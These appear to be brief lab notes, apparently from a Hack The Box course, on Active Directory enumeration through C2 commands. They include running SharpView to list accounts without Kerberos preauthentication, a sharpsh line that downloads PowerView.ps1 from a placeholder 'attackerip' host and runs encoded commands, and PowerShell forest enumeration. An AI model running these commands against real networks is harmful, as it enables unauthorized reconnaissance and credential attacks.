[https://github.com/tevora-threat/SharpView/tree/master/Compiled](https://github.com/tevora-threat/SharpView/tree/master/Compiled)
```bash
execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
```
- get-domain
- base64 encode a Powerview command and execute
```bash
sharpsh -- '-u http://attackerip:port/PowerView.ps1 -e -c <base64>'
```
## coff loaders (Beacon Object Files)
from the armory
c2tc-domaininfo
- domain functional level reference
  [https://eightwone.com/references/ad-functional-levels/](https://eightwone.com/references/ad-functional-levels/)
- more manual use of execute
```bash
execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains
```
